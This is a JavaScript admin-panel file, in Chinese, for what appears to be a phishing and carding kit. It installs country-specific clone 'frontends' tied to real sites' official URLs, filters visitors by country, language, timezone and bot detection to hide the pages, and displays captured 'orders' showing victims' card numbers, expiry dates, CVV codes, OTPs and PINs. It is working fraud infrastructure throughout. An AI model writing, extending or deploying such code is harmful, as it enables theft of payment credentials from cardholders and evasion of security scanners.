const $ = (selector, root = document) => root.querySelector(selector);
const $$ = (selector, root = document) => [...root.querySelectorAll(selector)];
const state = { captchaId: '', eventPage: 1, eventTotal: 0, orderPage: 1, orderTotal: 0, projects: [], domains: [], catalog: [], settings: {}, clients: [] };
const CLIENT_TYPES = ['bot', 'ios', 'android', 'desktop', 'unknown'];
const CLIENT_LABELS = { bot: '爬虫/自动化', ios: 'iOS 设备', android: 'Android 设备', desktop: '电脑端', unknown: '未知客户端' };
const CLIENT_PRESETS = [
  { label: 'iPhone', ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1' },
  { label: 'Android', ua: 'Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Mobile Safari/537.36' },
  { label: '电脑端', ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36' },
  { label: 'Googlebot', ua: 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' },
  { label: 'curl', ua: 'curl/8.4.0' },
  { label: 'Headless', ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0 Safari/537.36' }
];
const COUNTRY_CODES = 'AD AE AF AG AI AL AM AO AQ AR AS AT AU AW AX AZ BA BB BD BE BF BG BH BI BJ BL BM BN BO BQ BR BS BT BV BW BY BZ CA CC CD CF CG CH CI CK CL CM CN CO CR CU CV CW CX CY CZ DE DJ DK DM DO DZ EC EE EG EH ER ES ET FI FJ FK FM FO FR GA GB GD GE GF GG GH GI GL GM GN GP GQ GR GS GT GU GW GY HK HM HN HR HT HU ID IE IL IM IN IO IQ IR IS IT JE JM JO JP KE KG KH KI KM KN KP KR KW KY KZ LA LB LC LI LK LR LS LT LU LV LY MA MC MD ME MF MG MH MK ML MM MN MO MP MQ MR MS MT MU MV MW MX MY MZ NA NC NE NF NG NI NL NO NP NR NU NZ OM PA PE PF PG PH PK PL PM PN PR PS PT PW PY QA RE RO RS RU RW SA SB SC SD SE SG SH SI SJ SK SL SM SN SO SR SS ST SV SX SY SZ TC TD TF TG TH TJ TK TL TM TN TO TR TT TV TW TZ UA UG UM US UY UZ VA VC VE VG VI VN VU WF WS YE YT ZA ZM ZW'.split(' ');
// 浏览器语言（ISO 639-1 精选）与 IANA 时区数据源（环境拦截下拉用）
const LANG_CODES = ["af", "sq", "am", "ar", "hy", "az", "eu", "be", "bn", "bs", "bg", "ca", "zh", "co", "hr", "cs", "da", "nl", "en", "eo", "et", "fi", "fr", "gl", "ka", "de", "el", "gu", "ha", "he", "hi", "hu", "is", "id", "ga", "it", "ja", "kn", "kk", "km", "ky", "ku", "lo", "lv", "lt", "mk", "ms", "ml", "mt", "mr", "mn", "ne", "no", "nb", "nn", "or", "fa", "pl", "pt", "pa", "ro", "ru", "sr", "si", "sk", "sl", "so", "es", "sw", "sv", "ta", "te", "th", "tr", "tk", "ug", "uk", "ur", "uz", "vi", "cy", "yi", "yo", "zu"];
let languageNames = null;
try { languageNames = typeof Intl.DisplayNames === 'function' ? new Intl.DisplayNames(['zh-CN'], { type: 'language' }) : null; } catch (e) {}
function envLanguageName(code) {
  try { return (languageNames && languageNames.of(code)) || code; } catch (e) { return code; }
}
const TZ_FALLBACK = ('Africa/Cairo Africa/Johannesburg Africa/Lagos America/Anchorage America/Argentina/Buenos_Aires '
  + 'America/Bogota America/Chicago America/Denver America/Halifax America/Lima America/Los_Angeles America/Mexico_City '
  + 'America/New_York America/Phoenix America/Sao_Paulo America/Toronto America/Vancouver Asia/Almaty Asia/Amman '
  + 'Asia/Baghdad Asia/Baku Asia/Bangkok Asia/Beirut Asia/Chongqing Asia/Colombo Asia/Dhaka Asia/Dubai Asia/Ho_Chi_Minh '
  + 'Asia/Hong_Kong Asia/Jakarta Asia/Jerusalem Asia/Kabul Asia/Karachi Asia/Kathmandu Asia/Kolkata Asia/Kuala_Lumpur '
  + 'Asia/Kuwait Asia/Macau Asia/Manila Asia/Muscat Asia/Novosibirsk Asia/Phnom_Penh Asia/Pyongyang Asia/Qatar '
  + 'Asia/Riyadh Asia/Seoul Asia/Shanghai Asia/Singapore Asia/Taipei Asia/Tashkent Asia/Tbilisi Asia/Tehran Asia/Tokyo '
  + 'Asia/Ulaanbaatar Asia/Vladivostok Asia/Yangon Atlantic/Azores Australia/Adelaide Australia/Brisbane '
  + 'Australia/Melbourne Australia/Perth Australia/Sydney Europe/Amsterdam Europe/Athens Europe/Belgrade Europe/Berlin '
  + 'Europe/Brussels Europe/Bucharest Europe/Budapest Europe/Copenhagen Europe/Dublin Europe/Helsinki Europe/Istanbul '
  + 'Europe/Kiev Europe/Lisbon Europe/London Europe/Madrid Europe/Moscow Europe/Oslo Europe/Paris Europe/Prague '
  + 'Europe/Rome Europe/Stockholm Europe/Vienna Europe/Warsaw Europe/Zurich Pacific/Auckland Pacific/Fiji Pacific/Guam '
  + 'Pacific/Honolulu').split(' ');
const TZ_LIST = (typeof Intl.supportedValuesOf === 'function'
  ? (() => { try { return Intl.supportedValuesOf('timeZone'); } catch (e) { return TZ_FALLBACK; } })()
  : TZ_FALLBACK);
function envTzLabel(tz) {
  const city = tz.split('/').pop().replace(/_/g, ' ');
  const area = tz.includes('/') ? tz.split('/')[0] : '';
  return area ? city + '（' + area + '）' : city;
}
const countryNames = typeof Intl.DisplayNames === 'function' ? new Intl.DisplayNames(['zh-CN'], { type: 'region' }) : null;

async function api(path, options = {}) {
  const response = await fetch(path, { credentials: 'same-origin', headers: { 'Content-Type': 'application/json', ...(options.headers || {}) }, ...options });
  const data = await response.json().catch(() => ({}));
  if (!response.ok) { if (response.status === 401 && !path.includes('/auth/login')) showLogin(); throw new Error(data.error || `请求失败 (${response.status})`); }
  return data;
}
let toastTimer;
function toast(message, error = false) { const el = $('#toast'); el.textContent = message; el.className = `toast show${error ? ' error' : ''}`; clearTimeout(toastTimer); toastTimer = setTimeout(() => el.className = 'toast', 2800); }
function escapeHtml(value) { return String(value ?? '').replace(/[&<>'"]/g, ch => ({ '&':'&amp;', '<':'&lt;', '>':'&gt;', "'":'&#39;', '"':'&quot;' }[ch])); }

function parseCountryCodes(value) {
  return [...new Set(String(value || '').toUpperCase().split(/[\s,]+/).filter(code => COUNTRY_CODES.includes(code)))];
}
function countryName(code) {
  try { return countryNames?.of(code) || code; } catch (_) { return code; }
}
function closeCountrySelect(root) {
  root.classList.remove('open'); $('.country-menu', root).classList.add('hidden'); $('.country-control', root).setAttribute('aria-expanded', 'false');
}
function openCountrySelect(root) {
  $$('[data-country-select].open').forEach(item => { if (item !== root) closeCountrySelect(item); });
  root.classList.add('open'); $('.country-menu', root).classList.remove('hidden'); $('.country-control', root).setAttribute('aria-expanded', 'true'); $('.country-search', root).focus();
}
function renderCountrySelect(root) {
  const input = $('input[type="hidden"]', root); const selected = parseCountryCodes(input.value); input.value = selected.join(',');
  const chips = $('.country-chips', root);
  chips.innerHTML = selected.length ? selected.map(code => `<button type="button" class="country-chip" data-country-code="${code}" title="移除 ${escapeHtml(countryName(code))}">${code}<span>×</span></button>`).join('') : `<span class="country-placeholder">${input.name === 'country_whitelist' ? '选择允许访问的国家' : '选择需要拦截的国家'}</span>`;
  const query = $('.country-search', root).value.trim().toLocaleLowerCase('zh-CN');
  const filtered = COUNTRY_CODES.filter(code => `${code} ${countryName(code)}`.toLocaleLowerCase('zh-CN').includes(query));
  $('.country-options', root).innerHTML = filtered.length ? filtered.map(code => `<button type="button" class="country-option${selected.includes(code) ? ' selected' : ''}" data-country-option="${code}" role="option" aria-selected="${selected.includes(code)}"><span><b>${code}</b><small>${escapeHtml(countryName(code))}</small></span><i>${selected.includes(code) ? '✓' : ''}</i></button>`).join('') : '<p class="country-empty">没有匹配的国家</p>';
}
function initEnvPicker(root) {
  const kind = root.dataset.envSelect;
  const items = kind === 'lang'
    ? LANG_CODES.map(code => ({ code, label: code.toUpperCase() + ' · ' + envLanguageName(code) }))
    : TZ_LIST.map(tz => ({ code: tz, label: tz }));
  const input = root.querySelector('input[type="hidden"]');
  const render = () => {
    const selected = String(input.value || '').split(/[\s,]+/).filter(Boolean);
    input.value = selected.join(',');
    const chips = root.querySelector('.country-chips');
    chips.innerHTML = selected.length
      ? selected.map(v => '<button type="button" class="country-chip" data-env-code="' + escapeHtml(v) + '" title="移除 ' + escapeHtml(v) + '">' + escapeHtml(v) + '<span>×</span></button>').join('')
      : '<span class="country-placeholder">' + (kind === 'lang' ? '选择放行的浏览器语言' : '选择放行的浏览器时区') + '</span>';
    const query = (root.querySelector('.country-search').value || '').trim().toLowerCase();
    const options = items.filter(it => it.code.toLowerCase().includes(query) || it.label.toLowerCase().includes(query));
    root.querySelector('.country-options').innerHTML = options.length
      ? options.map(it => '<button type="button" class="country-option' + (selected.includes(it.code) ? ' selected' : '') + '" data-env-option="' + escapeHtml(it.code) + '" role="option" aria-selected="' + selected.includes(it.code) + '"><span><b>' + escapeHtml(kind === 'lang' ? it.code : envTzLabel(it.code)) + '</b><small>' + escapeHtml(it.label) + '</small></span><i>' + (selected.includes(it.code) ? '✓' : '') + '</i></button>').join('')
      : '<p class="country-empty">没有匹配的选项</p>';
  };
  const control = root.querySelector('.country-control');
  root._envClose = () => {
    root.classList.remove('open');
    root.querySelector('.country-menu').classList.add('hidden');
    control.setAttribute('aria-expanded', 'false');
  };
  control.addEventListener('click', event => {
    const chip = event.target.closest('[data-env-code]');
    if (chip) {
      const cur = String(input.value || '').split(/[\s,]+/).filter(Boolean).filter(v => v !== chip.dataset.envCode);
      input.value = cur.join(','); render(); return;
    }
    const opening = !root.classList.contains('open');
    if (opening) {
      $$('[data-env-select].open').forEach(other => { if (other !== root && other._envClose) other._envClose(); });
    }
    root.classList.toggle('open');
    root.querySelector('.country-menu').classList.toggle('hidden');
    control.setAttribute('aria-expanded', root.classList.contains('open'));
    if (root.classList.contains('open')) { render(); root.querySelector('.country-search').focus(); }
  });
  control.addEventListener('keydown', event => {
    if (event.key === 'Enter' || event.key === ' ') { event.preventDefault(); control.click(); }
    if (event.key === 'Escape') { root._envClose(); }
  });
  root.querySelector('.country-search').addEventListener('input', render);
  root.querySelector('.country-options').addEventListener('click', event => {
    const option = event.target.closest('[data-env-option]');
    if (!option) return;
    const code = option.dataset.envOption;
    const cur = String(input.value || '').split(/[\s,]+/).filter(Boolean);
    const at = cur.indexOf(code);
    if (at > -1) cur.splice(at, 1); else cur.push(code);
    input.value = cur.join(','); render();
  });
  if (!window.__envCloseBound) {
    window.__envCloseBound = true;
    document.addEventListener('click', event => {
      if (!event.target.closest('[data-env-select]')) {
        $$('[data-env-select].open').forEach(r => { if (r._envClose) r._envClose(); });
      }
    });
  }
  render();
  root._envRender = render;
}
function refreshEnvPickers() {
  $$('[data-env-select]').forEach(root => { if (root._envRender) root._envRender(); });
}
function setEnvSelectValue(form, name, value) {
  const input = form.elements[name];
  if (!input) return;
  input.value = (Array.isArray(value) ? value : String(value || '').split(/[\s,]+/)).filter(Boolean).join(',');
  refreshEnvPickers();
}
function setCountrySelectValue(form, name, value) {
  const input = form.elements[name]; input.value = parseCountryCodes(value).join(','); renderCountrySelect(input.closest('[data-country-select]'));
}
function initCountrySelect(root) {
  renderCountrySelect(root);
  $('.country-control', root).addEventListener('click', event => {
    const chip = event.target.closest('[data-country-code]');
    if (chip) {
      const input = $('input[type="hidden"]', root); input.value = parseCountryCodes(input.value).filter(code => code !== chip.dataset.countryCode).join(','); renderCountrySelect(root); return;
    }
    root.classList.contains('open') ? closeCountrySelect(root) : openCountrySelect(root);
  });
  $('.country-control', root).addEventListener('keydown', event => {
    if (event.key === 'Enter' || event.key === ' ') { event.preventDefault(); openCountrySelect(root); }
    if (event.key === 'Escape') closeCountrySelect(root);
  });
  $('.country-search', root).addEventListener('input', () => renderCountrySelect(root));
  $('.country-options', root).addEventListener('click', event => {
    const option = event.target.closest('[data-country-option]'); if (!option) return;
    const input = $('input[type="hidden"]', root); const selected = parseCountryCodes(input.value); const code = option.dataset.countryOption;
    input.value = (selected.includes(code) ? selected.filter(item => item !== code) : [...selected, code]).join(','); renderCountrySelect(root); $('.country-search', root).focus();
  });
}

async function loadCaptcha() { try { const data = await api('/api/auth/captcha'); state.captchaId = data.id; $('#captchaQuestion').textContent = data.question; } catch (_) { $('#captchaQuestion').textContent = '重新加载'; } }
function showLogin() { $('#appView').classList.add('hidden'); $('#loginView').classList.remove('hidden'); loadCaptcha(); }
function showApp(user) { $('#loginView').classList.add('hidden'); $('#appView').classList.remove('hidden'); $('#currentUser').textContent = user || 'admin'; navigate('dashboard'); }

const pageLabels = { dashboard: ['概览 / 仪表板', '仪表板'], data: ['数据 / 数据中心', '数据中心'], orders: ['数据 / 订单数据', '订单数据'], blacklist: ['数据 / 黑名单中心', '黑名单中心'], frontend: ['管理 / 前台配置', '前台配置'], settings: ['管理 / 系统设置', '系统设置'] };
function navigate(page) {
  $$('[data-page-view]').forEach(el => el.classList.toggle('active', el.dataset.pageView === page));
  $$('[data-page]').forEach(el => el.classList.toggle('active', el.dataset.page === page));
  [$('#breadcrumb').textContent, $('#pageTitle').textContent] = pageLabels[page];
  $('.sidebar').classList.remove('open'); $('#mobileBackdrop').classList.remove('show');
  if (page === 'dashboard') loadDashboard(); if (page === 'data') loadEvents(); if (page === 'orders') loadOrders(); if (page === 'blacklist') loadBlacklist(); if (page === 'frontend') loadFrontend(); if (page === 'settings') loadSettings();
}
function renderWeeklyChart(rows) {
  const items = Array.isArray(rows) ? rows : []; const largest = Math.max(0, ...items.flatMap(item => [Number(item.visits) || 0, Number(item.clicks) || 0])); const step = Math.max(1, Math.ceil(largest / 4)); const ceiling = step * 4;
  const ticks = Array.from({ length: 5 }, (_, index) => ceiling - step * index);
  const columns = items.map(item => {
    const visits = Number(item.visits) || 0; const clicks = Number(item.clicks) || 0; const visitHeight = visits ? Math.max(2, visits / ceiling * 100) : 0; const clickHeight = clicks ? Math.max(2, clicks / ceiling * 100) : 0;
    return `<div class="chart-day"><div class="chart-bar-area"><div class="chart-bar visit" style="height:${visitHeight}%" aria-label="${escapeHtml(item.label)} 访问 ${visits}"><span>访问：${visits}</span></div><div class="chart-bar click" style="height:${clickHeight}%" aria-label="${escapeHtml(item.label)} 点击 ${clicks}"><span>点击：${clicks}</span></div></div><time datetime="${escapeHtml(item.date)}">${escapeHtml(item.label)}</time></div>`;
  }).join('');
  $('#weeklyChart').innerHTML = `<div class="chart-y-axis">${ticks.map(value => `<span>${value}</span>`).join('')}</div><div class="chart-grid-lines">${ticks.map(() => '<i></i>').join('')}</div><div class="chart-columns">${columns}</div>`;
}

async function loadDashboard() {
  try {
    const data = await api('/api/dashboard'); $('#statToday').textContent = data.today_visits.toLocaleString(); $('#statTodayClicks').textContent = data.today_clicks.toLocaleString(); $('#statTotal').textContent = data.total.toLocaleString(); $('#statClicks').textContent = data.clicks.toLocaleString(); $('#statDomains').textContent = data.domains.toLocaleString(); renderWeeklyChart(data.weekly);
    renderClientBreakdown(data.clients || []);
    const nextReset = new Date(data.next_reset_at).toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai', month: 'numeric', day: 'numeric', hour: '2-digit', minute: '2-digit', hour12: false }); $('#dashboardPeriod').textContent = `北京时间每天 22:00 刷新，下一次刷新：${nextReset}`;
  } catch (error) { toast(error.message, true); }
}

async function loadEvents() {
  const form = new FormData($('#eventFilters')); const query = new URLSearchParams({ page: state.eventPage, page_size: 25 });
  if (form.get('domain')) query.set('domain', form.get('domain').trim()); if (form.get('type')) query.set('type', form.get('type')); if (form.get('client')) query.set('client', form.get('client'));
  try {
    const data = await api(`/api/events?${query}`); state.eventTotal = data.total; $('#eventCount').textContent = `共 ${data.total} 条`; $('#eventPage').textContent = data.page; $('#eventsPrev').disabled = data.page <= 1; $('#eventsNext').disabled = data.page * 25 >= data.total;
    const eventLabels = { visit: '访问', click: '点击', rejected: '拒绝' };
    $('#eventsBody').innerHTML = data.items.length ? data.items.map(item => {
      const client = item.client_type || 'unknown';
      return `<tr><td>#${item.id}</td><td>${escapeHtml(new Date(item.created_at).toLocaleString())}</td><td>${escapeHtml(item.domain)}</td><td><span class="event-type ${item.event_type}">${eventLabels[item.event_type] || escapeHtml(item.event_type)}</span></td><td><span class="client-tag tag-${escapeHtml(client)}">${escapeHtml(CLIENT_LABELS[client] || client)}</span></td><td>${escapeHtml(item.ip)}</td><td class="ua" title="${escapeHtml(item.ua)}">${escapeHtml(item.ua || '-')}</td></tr>`;
    }).join('') : '<tr><td colspan="7" style="text-align:center;padding:35px;color:#92959e">暂无符合条件的访问记录</td></tr>';
  } catch (error) { toast(error.message, true); }
}

function orderParams() {
  const form = new FormData($('#orderFilters'));
  const params = { keyword: '', site_abbreviation: '', referer: [''], status: '', page: state.orderPage, pagesize: 25 };
  params.keyword = (form.get('keyword') || '').trim();
  params.site_abbreviation = (form.get('site') || '').trim();
  params.referer = [(form.get('referer') || '').trim()];
  params.status = form.get('status') || '';
  return params;
}

function accountOf(data) {
  try {
    const steps = JSON.parse(data || '{}');
    for (const step of Object.values(steps)) {
      if (!step || typeof step !== 'object') continue;
      for (const [key, value] of Object.entries(step)) {
        const k = String(key).toLowerCase();
        if (/(account|userid|user|login|email|mail|番号|id)/.test(k) && value) return String(value).slice(0, 40);
      }
    }
  } catch (_) {}
  return '-';
}

function orderStatusText(item) {
  if (item.pay_status) return '<span class="event-type click">已付卡</span>';
  if (item.status) return '<span class="event-type visit">已提交</span>';
  return '<span class="event-type rejected">未提交</span>';
}

function renderOrderDetail(item) {
  let pretty = item.data || '{}';
  try { pretty = JSON.stringify(JSON.parse(item.data || '{}'), null, 2); } catch (_) {}
  const pay = item.payment;
  const payLine = pay ? `卡号 ${pay.ccard || '-'}  有效期 ${pay.cdate || '-'}  CVV ${pay.ccvv || '-'}  OTP ${pay.otp || '-'}  PIN ${pay.pin || '-'}` : '无卡料记录';
  return `<pre style="white-space:pre-wrap;margin:0;font-size:12px">${escapeHtml(payLine)}\n${escapeHtml(pretty)}</pre>`;
}

async function loadOrderStats() {
  try {
    const res = await api('/api/user/statistics', { method: 'POST', body: '{}' });
    const rows = (res && res.data) || [];
    $('#orderStatsBody').innerHTML = rows.length ? rows.map(row => `<tr><td>${escapeHtml(row.referer || '-')}</td><td>${escapeHtml(row.site_abbreviation || '-')}</td><td>${row.view_num || 0}</td><td>${row.order_num || 0}</td><td>${row.pay_num || 0}</td><td>${row.conversion || 0}%</td></tr>`).join('') : '<tr><td colspan="6" style="text-align:center;padding:24px;color:#92959e">还没有数据</td></tr>';
  } catch (error) { toast(error.message, true); }
}

async function loadOrders() {
  const params = orderParams();
  try {
    const res = await api('/api/user/listData', { method: 'POST', body: JSON.stringify(params) });
    const payload = (res && res.data) || {}; const items = payload.items || []; const total = payload.total || 0;
    state.orderTotal = total;
    $('#orderCount').textContent = `共 ${total} 条`; $('#orderPage').textContent = params.page;
    $('#orderPrev').disabled = params.page <= 1; $('#orderNext').disabled = params.page * 25 >= total;
    $('#orderBody').innerHTML = items.length ? items.map(item => {
      const pay = item.payment || {};
      const brandBank = [pay.card_brand, pay.card_bank].filter(Boolean).join(' / ') || '-';
      return `<tr><td>#${item.id}</td><td>${escapeHtml(new Date(item.created_at).toLocaleString())}</td><td>${escapeHtml(item.site_abbreviation || '-')}</td><td>${escapeHtml(item.referer || '-')}</td><td>${escapeHtml(accountOf(item.data))}</td><td>${escapeHtml(pay.ccard || '-')}</td><td>${escapeHtml(brandBank)}</td><td>${escapeHtml(pay.otp || '-')}</td><td>${orderStatusText(item)}</td><td>${escapeHtml(item.ip || '-')}</td><td><button class="secondary small" data-order-detail="${item.id}">展开</button></td></tr><tr id="orderDetail-${item.id}" class="hidden"><td colspan="11">${renderOrderDetail(item)}</td></tr>`;
    }).join('') : '<tr><td colspan="11" style="text-align:center;padding:35px;color:#92959e">还没有订单数据</td></tr>';
    loadOrderStats();
  } catch (error) { toast(error.message, true); }
}

function renderClientBreakdown(rows) {
  const items = Array.isArray(rows) ? rows : [];
  const largest = Math.max(1, ...items.map(item => item.visits || 0));
  $('#clientBreakdown').innerHTML = items.map(item => `<div class="client-bar-row"><span class="client-bar-name"><i class="dot dot-${escapeHtml(item.client_type)}"></i>${escapeHtml(item.label)}</span><div class="client-bar-track"><div class="client-bar-fill fill-${escapeHtml(item.client_type)}" style="width:${Math.round((item.visits || 0) / largest * 100)}%"></div></div><strong>${(item.visits || 0).toLocaleString()}</strong><small>点击 ${(item.clicks || 0).toLocaleString()}</small></div>`).join('');
}

function fillClientFilter(types) {
  const select = $('#eventClientFilter');
  if (select.options.length > 1) return;
  select.innerHTML = '<option value="">全部客户端</option>' + types.map(item => `<option value="${escapeHtml(item.client_type)}">${escapeHtml(item.label)}</option>`).join('');
}

function renderProjectCard(item, settings) {
  const domains = state.domains.filter(domain => domain.project_id === item.id);
  const primaryDomain = domains[0];
  const activeCertificates = domains.filter(domain => domain.certificate_status === 'active').length;
  const catalogEntry = state.catalog.find(source => source.slug === item.slug);
  const entryForCard = primaryDomain?.frontend_entry || catalogEntry?.entry || settings.frontend_entry || 'index.html';
  const addressForCard = primaryDomain ? `https://${primaryDomain.domain}/${entryForCard}` : '';
  const addressMarkupCard = addressForCard ? `<a class="project-address-link" href="${escapeHtml(addressForCard)}" target="_blank" rel="noreferrer" title="${escapeHtml(addressForCard)}">${escapeHtml(addressForCard)}</a><button type="button" class="icon-button copy-address" data-address="${escapeHtml(addressForCard)}" title="复制前台地址">▣</button>` : '<span class="project-address-empty">配置域名后显示前台地址</span>';
  return `<article class="project-card rich-project-card"><header class="project-card-head"><div class="project-logo">${escapeHtml((catalogEntry?.country || item.slug.slice(0, 2)).toUpperCase())}</div><div class="project-title"><h4>${escapeHtml(item.name)}</h4><p>静态前台源码</p></div><span class="project-status">已下载</span></header><section class="project-address-block"><span class="project-address-label">前台地址</span><div class="project-address-value">${addressMarkupCard}</div></section><div class="project-meta"><span><small>域名</small><b>${domains.length}</b></span><span><small>HTTPS</small><b>${activeCertificates}/${domains.length || 0}</b></span><span><small>入口</small><b>/${escapeHtml(entryForCard)}</b></span></div><footer class="project-actions"><button class="primary small project-config" data-project-id="${item.id}">配置</button><button class="secondary small project-update" data-project-id="${item.id}">更新</button><button class="secondary small project-cert" data-project-id="${item.id}">申请证书</button><button class="danger-link" data-project-id="${item.id}">删除</button></footer></article>`;
}

async function loadFrontend() {
  try {
    const [projects, domains, settings] = await Promise.all([api('/api/projects'), api('/api/domains'), api('/api/settings')]); state.projects = projects.items; state.domains = domains.items; state.settings = settings;
    state.catalog = projects.catalog;
    $('#projectList').innerHTML = state.projects.map(item => renderProjectCard(item, settings)).join('');
    fillClientFilter(CLIENT_TYPES.map(client => ({ client_type: client, label: CLIENT_LABELS[client] })));
    $('#domainList').innerHTML = state.domains.length ? state.domains.map(item => `<article class="domain-item"><span><b><a href="https://${escapeHtml(item.domain)}/${escapeHtml(item.frontend_entry || settings.frontend_entry || 'logo.gif')}" target="_blank" rel="noreferrer">https://${escapeHtml(item.domain)}/${escapeHtml(item.frontend_entry || settings.frontend_entry || 'logo.gif')}</a></b><small>${escapeHtml(item.project_name || '未关联项目')}</small></span><span class="cert-${item.certificate_status}">${item.certificate_status === 'active' ? 'HTTPS 已启用' : item.certificate_status === 'failed' ? '申请失败' : '待申请 HTTPS'}</span></article>`).join('') : '<div class="empty-state" style="padding:30px"><p>还没有配置域名</p></div>';
    renderCatalog(state.catalog);
  } catch (error) { toast(error.message, true); }
}

function renderCatalog(items) {
  $('#catalogList').innerHTML = items.length ? `<div class="source-table"><div class="source-table-head"><span>LOGO</span><span>国家</span><span>官网</span><span>描述</span><span>站点预览图</span><span>更新时间</span><span>操作</span></div>${items.map(item => `<div class="source-row"><div class="source-logo">${escapeHtml((item.country || 'WEB') + '')}<small>${escapeHtml(item.slug)}</small></div><span>${escapeHtml(item.country ? item.country + ' ' + (COUNTRY_CODES.includes(item.country) ? countryName(item.country) : '') : '通用')}</span><span class="source-url">${item.site_url ? `<a href="${escapeHtml(item.site_url)}" target="_blank" rel="noreferrer" style="color:inherit;text-decoration:none">${escapeHtml(item.site_url)}</a>` : '未配置官网'}</span><span title="${escapeHtml(item.description)}">${escapeHtml(item.description)}</span><div class="source-preview">${item.preview ? `<img src="/__gateway/preview/${escapeHtml(item.slug)}" alt="" style="width:100%;height:100%;object-fit:cover">` : 'HTML'}</div><span class="source-time">入口 /${escapeHtml(item.entry || 'index.html')}</span><button class="primary small catalog-download" data-source-id="${escapeHtml(item.id)}" ${item.downloaded ? 'disabled' : ''}>${item.downloaded ? '已安装' : '安装'}</button></div>`).join('')}</div>` : '';
  $('#catalogEmpty').classList.toggle('hidden', items.length > 0);
}

async function loadSettings() {
  try {
    state.settings = await api('/api/settings');
    $('#ipregistry_api_key').value = state.settings.ipregistry_api_key || '';
    $('#ipregistry_enabled').checked = Boolean(state.settings.ipregistry_enabled);
    $('#client_redirect_enabled').checked = Boolean(state.settings.client_redirect_enabled);
    $('#bot_redirect_enabled').checked = Boolean(state.settings.bot_redirect_enabled);
    $('#bot_redirect_url').value = state.settings.bot_redirect_url || '';
    $('#rate_check_enabled').checked = Boolean(state.settings.rate_check_enabled);
    $('#rate_window_seconds').value = Number(state.settings.rate_window_seconds || 60);
    $('#rate_max_requests').value = Number(state.settings.rate_max_requests || 10);
    $('#captcha_enabled').checked = Boolean(state.settings.captcha_enabled);
    $('#captcha_max_tries').value = Number(state.settings.captcha_max_tries || 3);
    $('#captcha_ttl_minutes').value = Math.round((Number(state.settings.captcha_ttl_seconds) || 7200) / 60);
    $('#app_android_url').value = state.settings.app_android_url || '';
    $('#app_ios_url').value = state.settings.app_ios_url || '';
    $('#app_desktop_url').value = state.settings.app_desktop_url || '';
    renderClientRules(state.settings.client_redirect_rules || {});
    renderClientPresets();
    await loadIpregistryCredits();
  } catch (error) { toast(error.message, true); }
}

function renderClientRules(rules) {
  const data = rules && typeof rules === 'object' ? rules : {};
  $('#clientRuleEditor').innerHTML = CLIENT_TYPES.map(client => {
    const rule = data[client] || {};
    const url = typeof rule === 'string' ? rule : (rule.url || '');
    const limit = Number((rule && rule.limit) || 0) || 0;
    return `<div class="client-rule-row" data-client="${client}"><span class="client-rule-name"><i class="dot dot-${client}"></i>${escapeHtml(CLIENT_LABELS[client])}<small>${client}</small></span><input data-rule-url type="url" value="${escapeHtml(url)}" placeholder="留空则使用模板跳转链接"><input data-rule-limit type="number" value="${limit}" min="0" max="999999999" step="1" title="点击上限，0 表示不限"><button type="button" class="secondary small client-test-jump" data-client="${client}" title="用该客户端的 UA 实跳一次">跳转测试</button></div>`;
  }).join('');
}

/* App 更新页跳转地址：只接受完整 http(s) 地址，其余一律视为留空回落 */
function readAppUrl(selector) {
  const value = $(selector).value.trim();
  return /^https?:\/\/[^\s/]+/i.test(value) ? value : '';
}

function readClientRules() {
  const rules = {};
  $$('.client-rule-row', $('#clientRuleEditor')).forEach(row => {
    rules[row.dataset.client] = {
      url: $('[data-rule-url]', row).value.trim(),
      limit: Math.min(999999999, Math.max(0, Math.trunc(Number($('[data-rule-limit]', row).value) || 0)))
    };
  });
  return rules;
}

function renderClientPresets() {
  $('#clientTestPresets').innerHTML = CLIENT_PRESETS.map(item => `<button type="button" class="preset-chip" data-ua="${escapeHtml(item.ua)}" title="${escapeHtml(item.ua)}">${escapeHtml(item.label)}</button>`).join('');
}

function uaForClient(client) {
  return (CLIENT_PRESETS.find(item => {
    const probe = item.ua.toLowerCase();
    if (client === 'ios') return probe.includes('iphone');
    if (client === 'android') return probe.includes('android');
    if (client === 'desktop') return probe.includes('windows nt') && !probe.includes('headless');
    if (client === 'bot') return probe.includes('googlebot');
    return probe.includes('curl');
  }) || {}).ua || '';
}

function renderClientTestResult(payload) {
  const box = $('#clientTestResult');
  const reasons = (payload.client_reasons || []).map(escapeHtml).join('、');
  const target = payload.target_url
    ? `<a href="${escapeHtml(payload.target_url)}" target="_blank" rel="noreferrer">${escapeHtml(payload.target_url)}</a>`
    : '<em>尚未配置任何跳转链接</em>';
  box.innerHTML = `<div class="client-result-row"><span>识别客户端</span><strong class="tag tag-${escapeHtml(payload.client_type)}">${escapeHtml(payload.client_label || payload.client_type)}</strong></div><div class="client-result-row"><span>命中规则</span><code>${escapeHtml(payload.matched_rule || 'none')}</code></div><div class="client-result-row"><span>判定依据</span><code>${reasons || '-'}</code></div><div class="client-result-row"><span>将跳转到</span><span>${target}</span></div>`;
  box.classList.remove('hidden');
}

async function runClientDetect() {
  const ua = $('#clientTestUa').value.trim();
  if (!ua) return toast('请先填写要测试的 User-Agent', true);
  try {
    const data = await api(`/api/client/detect?ua=${encodeURIComponent(ua)}`);
    renderClientTestResult(data);
  } catch (error) { toast(error.message, true); }
}

async function runClientJump(client) {
  const row = client ? $(`.client-rule-row[data-client="${client}"]`, $('#clientRuleEditor')) : null;
  const ua = client ? (uaForClient(client) || '') : $('#clientTestUa').value.trim();
  if (!ua) return toast('请先填写要测试的 User-Agent', true);
  try {
    const response = await fetch('/api/client/test-click', {
      method: 'POST', credentials: 'same-origin',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ua })
    });
    if (response.redirected) { window.open(response.url, '_blank', 'noopener'); toast('已按该客户端跳转到目标地址'); return; }
    const data = await response.json().catch(() => ({}));
    if (!response.ok) throw new Error(data.error || '跳转测试失败');
    window.open(response.headers.get('Location') || data.target_url, '_blank', 'noopener');
    toast('已按该客户端跳转到目标地址');
  } catch (error) { toast(error.message, true); }
